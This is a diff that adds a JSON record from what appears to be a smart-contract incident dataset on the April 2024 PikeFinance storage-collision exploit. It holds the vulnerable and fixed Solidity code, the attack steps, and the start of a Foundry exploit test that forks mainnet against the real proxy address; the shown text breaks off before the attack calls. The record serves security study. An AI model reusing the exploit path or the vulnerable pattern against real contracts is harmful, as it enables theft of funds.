@@ -1,0 +1,38 @@
+{
+ "id": "2024__2024-04-30_PikeFinance_StorageCollision_ETH",
+ "source_file": "2024/2024-04-30_PikeFinance_StorageCollision_ETH.md",
+ "title": "PikeFinance — Storage Collision Vulnerability Analysis",
+ "date": "2024-04-30",
+ "protocol": "PikeFinance",
+ "chain": "Ethereum",
+ "loss_raw": "$1,695,841 (479.39 ETH + 99,970.48 ARB + 64,126 OP)",
+ "loss_usd": 1695841.0,
+ "root_cause": "Storage layout change after upgrade shifted the `initialized` variable slot → unauthorized re-invocation of the initializer function",
+ "attack_tx": null,
+ "vulnerable_contract": "0xFC75...063",
+ "classes": [
+  "proxy-storage"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable structure — before upgrade (normal state)\ncontract SpokeV1 {\n    uint8 private _initialized;     // slot 0 ← initialized = 1 (initialization complete)\n    bool private _initializing;     // slot 0 (packed)\n    address public owner;           // slot 1\n    address public WNativeAddress;  // slot 2\n    // ...\n}\n\n// ❌ Vulnerable structure — after upgrade (Pausable added)\ncontract SpokeV2 is PausableUpgradeable {\n    // PausableUpgradeable uses slot 0 for _paused!\n    bool private _paused;           // slot 0 ← overwrites the former _initialized slot!\n    // _initialized is pushed from slot 0 to another slot\n    uint8 private _initialized;     // slot 1 ← value is 0 (uninitialized)!\n    bool private _initializing;     // slot 1 (packed)\n    address public owner;           // slot 2\n    // ...\n}",
+  "// ❌ Vulnerable code — initialize function (post-upgrade state)\nfunction initialize(\n    address _owner,\n    address _WNativeAddress,\n    address _uniswapHelperAddress,\n    address _tokenAddress,\n    uint16 _swapFee,\n    uint16 _withdrawFee\n) external {\n    // Danger: initializer modifier is nullified due to storage collision\n    // _initialized slot has changed and is always read as 0 → re-invocation allowed!\n    __Ownable_init();          // sets owner to msg.sender (the attacker)\n    __Pausable_init();\n    owner = _owner;            // ❌ overwritten with attacker's address\n    WNativeAddress = _WNativeAddress;\n    // ...\n}",
+  "// ❌ Vulnerable code — upgradeToAndCall\nfunction upgradeToAndCall(\n    address newImplementation,\n    bytes memory data\n) external {\n    // onlyOwner check → passes because the attacker is already owner!\n    require(msg.sender == owner, \"Not owner\");\n    // Write new implementation address to EIP-1967 slot\n    assembly {\n        sstore(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, newImplementation)\n    }\n    // If data is present, delegatecall to the new implementation\n    if (data.length > 0) {\n        // ❌ Executes withdraw() on attacker's contract → drains all funds\n        (bool success,) = newImplementation.delegatecall(data);\n        require(success, \"upgrade call failed\");\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — proper initialization guard\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\ncontract SpokeV2 is Initializable, OwnableUpgradeable, PausableUpgradeable {\n    // ✅ Storage gap prevents slot collisions in future upgrades\n    uint256[50] private __gap;\n\n    function initialize(\n        address _owner,\n        address _WNativeAddress,\n        address _uniswapHelperAddress,\n        address _tokenAddress,\n        uint16 _swapFee,\n        uint16 _withdrawFee\n    ) external initializer {  // ✅ initializer modifier fully blocks re-invocation\n        __Ownable_init(_owner);\n        __Pausable_init();\n        // ...\n    }\n}",
+  "// ✅ Apply storage gaps to all upgradeable contracts\ncontract SpokeBase is Initializable, OwnableUpgradeable, PausableUpgradeable {\n    // Gap to prevent storage slot collisions in future upgrades\n    // Declared in the base class of the inheritance chain\n    uint256[50] private __gap;\n}"
+ ],
+ "steps": [
+  "→ initialized check = 0 → re-init",
+  "→ owner set to attacker address",
+  "onlyOwner check → attacker = owner ✓",
+  "EIP-1967 slot → stores malicious",
+  "delegatecall → withdraw()",
+  "→ drains entire ETH balance of proxy",
+  "479.39 ETH → attacker wallet"
+ ],
+ "other_code": [
+  "Attacker EOA (0x1906...e23)\n    │\n    │  [1] call initialize(attacker, ...)\n    ▼\n┌─────────────────────────────────────────┐\n│  PikeFinance Proxy (0xFC75...063)       │\n│  EIP-1967 UUPS Proxy                    │\n│                                         │\n│  slot 0: _paused = false                │\n│         (former _initialized slot       │\n│          corrupted)                     │\n│  → initialized check = 0 → re-init     │\n│    allowed                              │\n└─────────────────┬───────────────────────┘\n                  │  delegatecall\n                  ▼\n┌─────────────────────────────────────────┐\n│  Implementation Contract (SpokeV2)      │\n│  initialize() executed                  │\n│  → owner set to attacker address        │\n└─────────────────────────────────────────┘\n    │",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\ninterface IPikeFinanceProxy {\n    function initialize(address, address, address, address, uint16, uint16) external;\n    function upgradeToAndCall(address, bytes memory) external;\n}\n\ncontract PikeFinance is Test {\n    uint256 blocknumToForkFrom = 19_771_058; // attack block\n    address constant PikeFinanceProxy = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;\n\n    function setUp() public {\n        vm.deal(address(this), 0);\n        // [Step 0] Fork Ethereum mainnet (at attack block)\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\" Attacker ETH Balance Before exploit\", address(this).balance, 18);\n\n        // [S"
+ ]
+}
